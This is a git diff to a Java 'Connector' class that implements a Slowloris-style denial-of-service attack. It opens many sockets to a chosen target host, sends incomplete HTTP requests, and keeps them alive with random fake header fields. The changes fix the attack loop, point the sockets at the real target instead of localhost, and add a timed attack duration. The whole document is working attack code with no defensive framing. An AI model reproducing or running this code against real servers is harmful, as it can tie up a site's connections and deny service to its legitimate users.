@@ -8,11 +8,11 @@ import java.util.Random;
 public class Connector implements Runnable
 {
     /** the number of socket connections to the server per `Connector` instance */
-    private static final int NUMBER_OF_CONNECTIONS = 50;
+    private static final int NUMBER_OF_CONNECTIONS = 5;
     /** the server port to connect to */
-    private static int serverPort;
+    private int serverPort;
     /** number of seconds to stop the attack after, 0 = never stop */
-    private static int attackSeconds;
+    private int attackMinutes;
 
     /** the URL of the target */
     private URL targetURL;
@@ -21,10 +21,10 @@ public class Connector implements Runnable
     /** the partial requests sent for each connection */
     private String[] allPartialRequests = new String[NUMBER_OF_CONNECTIONS];
 
-    public Connector(String target, int serverPort, int attackSeconds) throws MalformedURLException
+    public Connector(String target, int serverPort, int attackMinutes) throws MalformedURLException
     {
         this.serverPort = serverPort;
-        this.attackSeconds = attackSeconds;
+        this.attackMinutes = attackMinutes;
         String targetPrefix = target.startsWith("http://") ? "" : "http://";
         targetURL = new URL(targetPrefix + target);
         allPartialRequests = createInitialPartialRequests();
@@ -79,8 +79,8 @@ public class Connector implements Runnable
     {
         try
         {
-            allSockets[index] = new Socket(InetAddress.getByName("localhost"), serverPort); // todo: check, make program parse localhost properly
-            //allSockets[index] = new Socket(InetAddress.getByName(targetURL.toString()), serverPort); // todo: check
+            System.out.println("Connector: " + toString() + "     Connecting: " + index);
+            allSockets[index] = new Socket(InetAddress.getByName(targetURL.toExternalForm().replace("http://", "")), serverPort);
         }
         catch(IOException ioe)
         {
@@ -96,6 +96,7 @@ public class Connector implements Runnable
 
         for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++) // each connection sends a partial request
         {
+            System.out.println("Connector: " + toString() + "    Sending partial request: " + i);
             sendPartialRequest(i);
             try
             {
@@ -108,24 +109,48 @@ public class Connector implements Runnable
         }
 
         // main attack loop
-        while((System.currentTimeMillis() - startTime) / 1000.0 > attackSeconds)
-        {
-            for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
-            {
-                sendFalseHeaderField(i);
-                try
-                {
-                    Thread.sleep(new Random().nextInt(3407)); // wait a random time before sending
-                }
-                catch(InterruptedException ie)
-                {
-                    ie.printStackTrace();
-                }
+        while((System.currentTimeMillis() - startTime) < (attackMinutes * 60 * 1000))
+            attack();
 
-                if(i == NUMBER_OF_CONNECTIONS - 1) // reset the counter
-                    i = 0;
+        closeAllConnections();
+    }
+
+    /**
+     * "gracefully" terminates all the connections by sending \r\n
+     */
+    private void closeAllConnections()
+    {
+        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
+        {
+            try
+            {
+                allSockets[i].getOutputStream().write("\r\n".getBytes());
             }
-        } // todo: send Connection: Close when finished
+            catch(IOException ioe)
+            {
+                ioe.printStackTrace();
+            }
+        }
+    }
+
+    /**
+     * sends useless information to the server for each connection. Keeps the connection
+     * alive
+     */
+    private void attack()
+    {
+        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
+        {
+            sendFalseHeaderField(i);
+            try
+            {
+                Thread.sleep(new Random().nextInt(3407)); // wait a random time before sending
+            }
+            catch(InterruptedException ie)
+            {
+                ie.printStackTrace();
+            }
+        }
     }
 
     /**
@@ -135,7 +160,7 @@ public class Connector implements Runnable
     private void sendFalseHeaderField(int index)
     {
         char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
-        String fakeField = alphabet[new Random().nextInt(alphabet.length)] + "-" + alphabet[new Random().nextInt(alphabet.length)] + ": " + new Random().nextInt();
+        String fakeField = alphabet[new Random().nextInt(alphabet.length)] + "-" + alphabet[new Random().nextInt(alphabet.length)] + ": " + new Random().nextInt() + "\r\n";
         try
         {
             allSockets[index].getOutputStream().write(fakeField.getBytes());
@@ -145,7 +170,6 @@ public class Connector implements Runnable
             ioe.printStackTrace();
             initConnection(index); // try to re-connect
         }
-
     }
 
     /**
@@ -163,6 +187,5 @@ public class Connector implements Runnable
             ioe.printStackTrace();
             initConnection(index); // try to reestablish connection
         }
-
     }
 }
